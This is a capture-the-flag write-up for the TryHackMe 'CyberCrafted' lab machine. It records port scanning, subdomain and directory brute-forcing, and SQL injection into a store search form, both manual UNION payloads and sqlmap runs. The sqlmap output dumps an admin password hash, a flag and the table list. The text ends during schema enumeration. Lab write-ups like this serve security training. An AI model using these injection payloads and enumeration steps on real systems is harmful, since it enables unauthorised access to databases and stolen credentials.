# CyberCrafted — Writeup

## Overview
### CyberCrafted — Writeup
### CyberCrafted — Writeup
----
Pwn this pay-to-win Minecraft server!
---
![](https://m4dr1nch.github.io/writeups/cybercrafted/assets/img/cc-banner.png)
![111](https://tryhackme-images.s3.amazonaws.com/room-icons/dd06737472c79a806e2049ddeb3af354.png)
### Deploy the machine
Start Machine
Connect to the TryHackMe network and deploy the machine. If you do not know how to connect to the VPN, please complete the [OpenVPN](https://tryhackme.com/room/openvpn) room or use the AttackBox by clicking the Start AttackBox button.
_Note that this machine may take a couple of minutes to boot up. I would recommend giving it at least five minutes._
Answer the questions below
Ready.. Set...
Correct Answer
Go

## Privilege Escalation
You have found an IP address of an in-development Minecraft server. Can you **root** it?
![](https://m4dr1nch.github.io/writeups/cybercrafted/assets/img/cc-logo.png)
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.88.215 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.88.215:22
Open 10.10.88.215:80
Open 10.10.88.215:25565
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.88.215 [3 ports]
Discovered open port 22/tcp on 10.10.88.215
Discovered open port 80/tcp on 10.10.88.215
Discovered open port 25565/tcp on 10.10.88.215
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.88.215
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.88.215.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.88.215
Host is up, received user-set (0.22s latency).

PORT      STATE SERVICE   REASON  VERSION
22/tcp    open  ssh       syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3736ceb9ac728ad7a6b78e45d0ce3c00 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk3jETo4Cogly65TvK7OYID0jjr/NbNWJd1TvT3mpDonj9KkxJ1oZ5xSBy+3hOHwDcS0FG7ZpFe8BNwe/ASjD91/TL/a1gH6OPjkZblyc8FM5pROz0Mn1JzzB/oI+rHIaltq8JwTxJMjTt1qjfjf3yqHcEA5zLLrUr+a47vkvhYzbDnrWEMPXJ5w9V2EUxY9LUu0N8eZqjnzr1ppdm3wmC4li/hkKuzkqEsdE4ENGKz322l2xyPNEoaHhEDmC94LTp1FcR4ceeGQ56WzmZe6CxkKA3iPz55xSd5Zk0XTZLTarYTMqxxe+2cRAgqnCtE1QsE7cX4NA/E90EcmBnJh5T
|   256 e9e7338a77282cd48c6d8a2ce7889530 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLntlbdcO4xygQVgz6dRRx15qwlCojOYACYTiwta7NFXs9M2d2bURHdM1dZJBPh5pS0V69u0snOij/nApGU5AZo=
|   256 76a2b1cf1b3dce6c60f563243eef70d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDbLLQOGt+qbIb4myX/Z/sYQ7cj20+ssISzpZCaMD4/u
80/tcp    open  http      syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://cybercrafted.thm/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft syn-ack Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts      
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.88.215 cybercrafted.thm

view-source:http://cybercrafted.thm/

<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster vhost -u http://cybercrafted.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 64  
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cybercrafted.thm/
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cybercrafted.thm Status: 200 [Size: 937]
Found: store.cybercrafted.thm Status: 403 [Size: 287]
Found: www.admin.cybercrafted.thm Status: 200 [Size: 937]
Found: www.store.cybercrafted.thm Status: 403 [Size: 291]
Found: gc._msdcs.cybercrafted.thm Status: 400 [Size: 301]
Progress: 1447 / 114442 (1.26%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts     
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.88.215 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm

                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://admin.cybercrafted.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://admin.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/login.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/index.php            (Status: 200) [Size: 937]
http://admin.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
http://admin.cybercrafted.thm/panel.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
Progress: 181361 / 882244 (20.56%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
 Finished
===============================================================
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://store.cybercrafted.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.cybercrafted.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://store.cybercrafted.thm/index.html           (Status: 403) [Size: 287]
http://store.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://store.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://store.cybercrafted.thm/search.php           (Status: 200) [Size: 838]
http://store.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
^C
[!] Keyboard interrupt detected, terminating.

===============================================================
 Finished
===============================================================

http://store.cybercrafted.thm/search.php

' or '1'='1

' or 1='1

and we dump all the products

now using sqlmap then manually

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://store.cybercrafted.thm/search.php --forms --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:44:37 //

[12:44:37] [INFO] testing connection to the target URL
[12:44:38] [INFO] searching for forms
[1/1] Form:
POST http://store.cybercrafted.thm/search.php
POST data: search=&submit=
do you want to test this form? [Y/n/q] 
> Y

do you want to fill blank fields with random values? [Y/n] 
[12:44:47] [INFO] using '/home/witty/.local/share/sqlmap/output/results-03082023_1244pm.csv' as the CSV results file in multiple targets mode
[12:44:47] [INFO] testing if the target URL content is stable
[12:44:48] [INFO] target URL content is stable
[12:44:48] [INFO] testing if POST parameter 'search' is dynamic
[12:44:48] [WARNING] POST parameter 'search' does not appear to be dynamic
[12:44:48] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[12:44:49] [INFO] testing for SQL injection on POST parameter 'search'
[12:44:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:44:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:44:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:44:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:44:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:44:56] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:44:57] [INFO] testing 'Generic inline queries'
[12:44:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:44:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:44:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:45:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:45:11] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:45:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:45:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:45:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:45:23] [INFO] target URL appears to have 4 columns in query
[12:45:24] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
[12:45:34] [INFO] testing if POST parameter 'submit' is dynamic
[12:45:34] [WARNING] POST parameter 'submit' does not appear to be dynamic
[12:45:34] [WARNING] heuristic (basic) test shows that POST parameter 'submit' might not be injectable
[12:45:34] [INFO] testing for SQL injection on POST parameter 'submit'
[12:45:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:45:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:45:36] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[12:45:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:45:53] [WARNING] POST parameter 'submit' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 118 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=VcYe' AND (SELECT 1466 FROM (SELECT(SLEEP(5)))IIWF) AND 'JIga'='JIga&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=VcYe' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x415254504c756449536e504947674b4e794f4772454b476c6d5a49527157476f4846706f76514e48,0x716b766271)-- -&submit=
---
do you want to exploit this SQL injection? [Y/n] Y
[12:46:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[12:46:09] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:46:09] [INFO] fetching current database
[12:46:09] [INFO] fetching tables for database: 'webapp'
[12:46:09] [INFO] fetching columns for table 'admin' in database 'webapp'
[12:46:10] [INFO] fetching entries for table 'admin' in database 'webapp'
[12:46:10] [INFO] recognized possible password hashes in column 'hash'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] Y
[12:46:19] [INFO] writing hashes to a temporary file '/tmp/sqlmapgfp1knxu1879998/sqlmaphashes-xceo54w9.txt' 
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: webapp
Table: admin
[2 entries]
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+

[12:46:29] [INFO] table 'webapp.admin' dumped to CSV file '/home/witty/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
[12:46:29] [INFO] fetching columns for table 'stock' in database 'webapp'
[12:46:30] [INFO] fetching entries for table 'stock' in database 'webapp'
Database: webapp
Table: stock
[139 entries]
+-----+------+------------------------+--------+
| id  | cost | item                   | amount |
+-----+------+------------------------+--------+
| 4   | 0.5$ | Acacia Boat            | 1x     |
| 5   | 0.5$ | Armor Stand            | 1x     |
| 6   | 0.2$ | Beetroot Seeds         | 16x    |
| 7   | 0.5$ | Birch Boat             | 1x     |
| 8   | 1$   | Bottle of Enchanting   | 64x    |
| 9   | 0.5$ | Bow                    | 1x     |
| 10  | 0.2$ | Bucket                 | 1x     |
| 11  | 0.1$ | Carrot                 | 64x    |
| 12  | 0.4$ | Cocoa Beans            | 64     |
| 13  | 0.5$ | Crossbow               | 1x     |
| 14  | 0.5$ | Dark Oak Boat          | 1x     |
| 15  | 0.1$ | Egg                    | 16x    |
| 16  | 5$   | End Crystal            | 1x     |
| 17  | 1$   | Ender Pearl            | 16     |
| 18  | 2$   | Eye of Ender           | 16x    |
| 19  | 1$   | Fire Charge            | 16x    |
| 20  | 0.8$ | Firework Rocket        | 16x    |
| 21  | 0.2$ | Fishing Rod            | 1x     |
| 22  | 0.2$ | Flint and Steel        | 1x     |
| 23  | 0.2$ | Glow Berries           | 16x    |
| 24  | 0.1$ | Glow Item Frame        | 1x     |
| 25  | 0.1$ | Item Frame             | 1x     |
| 26  | 0.5$ | Jungle Boat            | 1x     |
| 27  | 0.1$ | Kelp                   | 64x    |
| 28  | 0.5$ | Lava Bucket            | 1x     |
| 29  | 0.6$ | Lead                   | 1x     |
| 30  | 2$   | Lingering Potion       | 16x    |
| 31  | 0.8$ | Melon Seeds            | 64x    |
| 32  | 0.8$ | Minecart               | 1x     |
| 33  | 1$   | Nether Wart            | 16x    |
| 34  | 0.5$ | Oak Boat               | 1x     |
| 35  | 0.2$ | Painting               | 1x     |
| 36  | 1$   | Potato                 | 64x    |
| 37  | 2$   | Redstone Dust          | 64x    |
| 38  | 0.4$ | Snowball               | 16x    |
| 39  | 0.1$ | Splash Potion          | 1x     |
| 40  | 0.5$ | Spruce Boat            | 1x     |
| 41  | 1$   | String                 | 64x    |
| 42  | 5$   | Trident                | 1x     |
| 43  | 0.5$ | Water Bucket           | 1x     |
| 44  | 0.5$ | Wheat Seeds            | 64x    |
| 45  | 2$   | Arrow                  | 64x    |
| 46  | 1$   | Bone                   | 64x    |
| 47  | 0.4$ | Bone Meal              | 64x    |
| 48  | 0.5$ | Bowl                   | 16x    |
| 49  | 2$   | Bread                  | 64x    |
| 50  | 1$   | Chainmail Boots        | 1x     |
| 51  | 1.5$ | Chainmail Chestplate   | 1x     |
| 52  | 1$   | Chainmail Helmet       | 1x     |
| 53  | 1.2$ | Chainmail Leggings     | 1x     |
| 54  | 0.5$ | Compass                | 1x     |
| 55  | 1$   | Cooked Chicken         | 64x    |
| 56  | 1$   | Cooked Cod             | 64x    |
| 57  | 1$   | Cooked Mutton          | 64x    |
| 58  | 1$   | Cooked Porkchop        | 64x    |
| 59  | 1$   | Cooked Rabbit          | 64x    |
| 60  | 1$   | Cooked Salmon          | 64x    |
| 61  | 2$   | Diamond Axe            | 1x     |
| 62  | 4$   | Diamond Boots          | 1x     |
| 63  | 6$   | Diamond Chestplate     | 1x     |
| 64  | 2$   | Diamond Helmet         | 1x     |
| 65  | 1$   | Diamond Hoe            | 1x     |
| 66  | 2$   | Diamond Horse Armor    | 1x     |
| 67  | 5$   | Diamond Leggings       | 1x     |
| 68  | 3$   | Diamond Pickaxe        | 1x     |
| 69  | 2$   | Diamond Shovel         | 1x     |
| 70  | 4$   | Diamond Sword          | 1x     |
| 71  | 8$   | Elytra                 | 1x     |
| 72  | 150$ | Enchanted Golden Apple | 64x    |
| 73  | 5$   | Golden Apple           | 64x    |
| 74  | 1$   | Golden Axe             | 1x     |
| 75  | 2$   | Golden Boots           | 1x     |
| 76  | 4$   | Golden Carrot          | 64x    |
| 77  | 2$   | Golden Chestplate      | 1x     |
| 78  | 1$   | Golden Helmet          | 1x     |
| 79  | 0.5$ | Golden Hoe             | 1x     |
| 80  | 0.5$ | Golden Horse Armor     | 1x     |
| 81  | 0.5$ | Golden Leggings        | 1x     |
| 82  | 0.5$ | Golden Pickaxe         | 1x     |
| 83  | 0.5$ | Golden Shovel          | 1x     |
| 84  | 0.5$ | Golden Sword           | 1x     |
| 85  | 1$   | Iron Axe               | 1x     |
| 86  | 1.5$ | Iron Boots             | 1x     |
| 87  | 3$   | Iron Chestplate        | 1x     |
| 88  | 1$   | Iron Helmet            | 1x     |
| 89  | 0.5$ | Iron Hoe               | 1x     |
| 90  | 2$   | Iron Horse Armor       | 1x     |
| 91  | 2$   | Iron Leggings          | 1x     |
| 92  | 1$   | Iron Pickaxe           | 1x     |
| 93  | 0.8$ | Iron Shovel            | 1x     |
| 94  | 1$   | Iron Sword             | 1x     |
| 95  | 5$   | Lapis Lazuli           | 64x    |
| 96  | 0.2$ | Milk Bucket            | 1x     |
| 97  | 1$   | Mushroom Stew          | 16x    |
| 98  | 4$   | Name Tag               | 16x    |
| 99  | 5$   | Netherite Axe          | 1x     |
| 100 | 6$   | Netherite Boots        | 1x     |
| 101 | 10$  | Netherite Chestplate   | 1x     |
| 102 | 4$   | Netherite Helmet       | 1x     |
| 103 | 6    | Netherite Hoe          | 1x     |
| 104 | 8$   | Netherite Leggings     | 1x     |
| 105 | 5$   | Netherite Pickaxe      | 1x     |
| 106 | 5$   | Netherite Shovel       | 1x     |
| 107 | 5$   | Netherite Sword        | 1x     |
| 108 | 1$   | Saddle                 | 1x     |
| 109 | 0.5$ | Shears                 | 1x     |
| 110 | 0.5$ | Shield                 | 1x     |
| 111 | 1$   | Sugar                  | 64x    |
| 112 | 4$   | Suspicious Stew        | 1x     |
| 113 | 4$   | Tipped Arrow           | 16x    |
| 114 | 5$   | Totem of Undying       | 1x     |
| 115 | 0.2$ | Tropical Fish          | 1x     |
| 116 | 4$   | Turtle Shell           | 16x    |
| 117 | 2$   | Wheat                  | 64x    |
| 118 | 2$   | Amethyst Shard         | 16x    |
| 119 | 5$   | Blaze Powder           | 64x    |
| 120 | 5$   | Blaze Rod              | 32x    |
| 121 | 1$   | Clock                  | 1x     |
| 122 | 3$   | Coal                   | 64x    |
| 123 | 5$   | Copper Ingot           | 64x    |
| 124 | 20$  | Diamond                | 64x    |
| 125 | 20$  | Emerald                | 64x    |
| 126 | 2$   | Flint                  | 64x    |
| 127 | 10$  | Ghast Tear             | 64x    |
| 128 | 5$   | Glowstone Dust         | 64x    |
| 129 | 5$   | Gunpowder              | 64x    |
| 130 | 4$   | Heart of the Sea       | 1x     |
| 131 | 10$  | Iron Ingot             | 64x    |
| 132 | 2$   | Lapis Lazuli           | 64x    |
| 133 | 2$   | Nautilus Shell         | 16x    |
| 134 | 1$   | Nether Brick           | 64x    |
| 135 | 8$   | Nether Quartz          | 64x    |
| 136 | 10$  | Nether Star            | 1x     |
| 137 | 500$ | Netherite Ingot        | 64x    |
| 138 | 50$  | Netherite Scrap        | 64x    |
| 139 | 5$   | Raw Gold               | 64x    |
| 140 | 5$   | Raw Iron               | 64x    |
| 141 | 2$   | Shulker Shell          | 16x    |
| 142 | 1$   | Slimeball              | 16x    |
+-----+------+------------------------+--------+

[12:46:30] [INFO] table 'webapp.stock' dumped to CSV file '/home/witty/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
[12:46:30] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 29 times
[12:46:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-03082023_1244pm.csv'

[*] ending @ 12:46:30 //

' OR 1=1-- -
we search by a word that doesn't exist
adasd' union select 1,2,3,4 #
adasd' union select 1,2,3,database() #

there are 2 ways to dump all the tables names 

adada' union select 1,2,3,table_name from information_schema.tables # 

2 	3 	CHARACTER_SETS
2 	3 	COLLATIONS
2 	3 	COLLATION_CHARACTER_SET_APPLICABILITY
2 	3 	COLUMNS
2 	3 	COLUMN_PRIVILEGES
2 	3 	ENGINES
2 	3 	EVENTS
2 	3 	FILES
2 	3 	GLOBAL_STATUS
2 	3 	GLOBAL_VARIABLES
2 	3 	KEY_COLUMN_USAGE
2 	3 	OPTIMIZER_TRACE
2 	3 	PARAMETERS
2 	3 	PARTITIONS
2 	3 	PLUGINS
2 	3 	PROCESSLIST
2 	3 	PROFILING
2 	3 	REFERENTIAL_CONSTRAINTS
2 	3 	ROUTINES
2 	3 	SCHEMATA
2 	3 	SCHEMA_PRIVILEGES
2 	3 	SESSION_STATUS
2 	3 	SESSION_VARIABLES
2 	3 	STATISTICS
2 	3 	TABLES
2 	3 	TABLESPACES
2 	3 	TABLE_CONSTRAINTS
2 	3 	TABLE_PRIVILEGES
2 	3 	TRIGGERS
2 	3 	USER_PRIVILEGES
2 	3 	VIEWS
2 	3 	INNODB_LOCKS
2 	3 	INNODB_TRX
2 	3 	INNODB_SYS_DATAFILES
2 	3 	INNODB_FT_CONFIG
2 	3 	INNODB_SYS_VIRTUAL
2 	3 	INNODB_CMP
2 	3 	INNODB_FT_BEING_DELETED
2 	3 	INNODB_CMP_RESET
2 	3 	INNODB_CMP_PER_INDEX
2 	3 	INNODB_CMPMEM_RESET
2 	3 	INNODB_FT_DELETED
2 	3 	INNODB_BUFFER_PAGE_LRU
2 	3 	INNODB_LOCK_WAITS
2 	3 	INNODB_TEMP_TABLE_INFO
2 	3 	INNODB_SYS_INDEXES
2 	3 	INNODB_SYS_TABLES
2 	3 	INNODB_SYS_FIELDS
2 	3 	INNODB_CMP_PER_INDEX_RESET
2 	3 	INNODB_BUFFER_PAGE
2 	3 	INNODB_FT_DEFAULT_STOPWORD
2 	3 	INNODB_FT_INDEX_TABLE
2 	3 	INNODB_FT_INDEX_CACHE
2 	3 	INNODB_SYS_TABLESPACES
2 	3 	INNODB_METRICS
2 	3 	INNODB_SYS_FOREIGN_COLS
2 	3 	INNODB_CMPMEM
2 	3 	INNODB_BUFFER_POOL_STATS
2 	3 	INNODB_SYS_COLUMNS
2 	3 	INNODB_SYS_FOREIGN
2 	3 	INNODB_SYS_TABLESTATS
2 	3 	columns_priv
2 	3 	db
2 	3 	engine_cost
2 	3 	event
2 	3 	func
2 	3 	general_log
2 	3 	gtid_executed
2 	3 	help_category
2 	3 	help_keyword
2 	3 	help_relation
2 	3 	help_topic
2 	3 	innodb_index_stats
2 	3 	innodb_table_stats
2 	3 	ndb_binlog_index
2 	3 	plugin
2 	3 	proc
2 	3 	procs_priv
2 	3 	proxies_priv
2 	3 	server_cost
2 	3 	servers
2 	3 	slave_master_info
2 	3 	slave_relay_log_info
2 	3 	slave_worker_info
2 	3 	slow_log
2 	3 	tables_priv
2 	3 	time_zone
2 	3 	time_zone_leap_second
2 	3 	time_zone_name
2 	3 	time_zone_transition
2 	3 	time_zone_transition_type
2 	3 	user
2 	3 	accounts
2 	3 	cond_instances
2 	3 	events_stages_current
2 	3 	events_stages_history
2 	3 	events_stages_history_long
2 	3 	events_stages_summary_by_account_by_event_name
2 	3 	events_stages_summary_by_host_by_event_name
2 	3 	events_stages_summary_by_thread_by_event_name
2 	3 	events_stages_summary_by_user_by_event_name
2 	3 	events_stages_summary_global_by_event_name
2 	3 	events_statements_current
2 	3 	events_statements_history
2 	3 	events_statements_history_long
2 	3 	events_statements_summary_by_account_by_event_name
2 	3 	events_statements_summary_by_digest
2 	3 	events_statements_summary_by_host_by_event_name
2 	3 	events_statements_summary_by_program
2 	3 	events_statements_summary_by_thread_by_event_name
2 	3 	events_statements_summary_by_user_by_event_name
2 	3 	events_statements_summary_global_by_event_name
2 	3 	events_transactions_current
2 	3 	events_transactions_history
2 	3 	events_transactions_history_long
2 	3 	events_transactions_summary_by_account_by_event_name
2 	3 	events_transactions_summary_by_host_by_event_name
2 	3 	events_transactions_summary_by_thread_by_event_name
2 	3 	events_transactions_summary_by_user_by_event_name
2 	3 	events_transactions_summary_global_by_event_name
2 	3 	events_waits_current
2 	3 	events_waits_history
2 	3 	events_waits_history_long
2 	3 	events_waits_summary_by_account_by_event_name
2 	3 	events_waits_summary_by_host_by_event_name
2 	3 	events_waits_summary_by_instance
2 	3 	events_waits_summary_by_thread_by_event_name
2 	3 	events_waits_summary_by_user_by_event_name
2 	3 	events_waits_summary_global_by_event_name
2 	3 	file_instances
2 	3 	file_summary_by_event_name
2 	3 	file_summary_by_instance
2 	3 	host_cache
2 	3 	hosts
2 	3 	memory_summary_by_account_by_event_name
2 	3 	memory_summary_by_host_by_event_name
2 	3 	memory_summary_by_thread_by_event_name
2 	3 	memory_summary_by_user_by_event_name
2 	3 	memory_summary_global_by_event_name
2 	3 	metadata_locks
2 	3 	mutex_instances
2 	3 	objects_summary_global_by_type
2 	3 	performance_timers
2 	3 	prepared_statements_instances
2 	3 	replication_applier_configuration
2 	3 	replication_applier_status
2 	3 	replication_applier_status_by_coordinator
2 	3 	replication_applier_status_by_worker
2 	3 	replication_connection_configuration
2 	3 	replication_connection_status
2 	3 	replication_group_member_stats
2 	3 	replication_group_members
2 	3 	rwlock_instances
2 	3 	session_account_connect_attrs
2 	3 	session_connect_attrs
2 	3 	setup_actors
2 	3 	setup_consumers
2 	3 	setup_instruments
2 	3 	setup_objects
2 	3 	setup_timers
2 	3 	socket_instances
2 	3 	socket_summary_by_event_name
2 	3 	socket_summary_by_instance
2 	3 	status_by_account
2 	3 	status_by_host
2 	3 	status_by_thread
2 	3 	status_by_user
2 	3 	table_handles
2 	3 	table_io_waits_summary_by_index_usage
2 	3 	table_io_waits_summary_by_table
2 	3 	table_lock_waits_summary_by_table
2 	3 	threads
2 	3 	user_variables_by_thread
2 	3 	users
2 	3 	variables_by_thread
2 	3 	host_summary
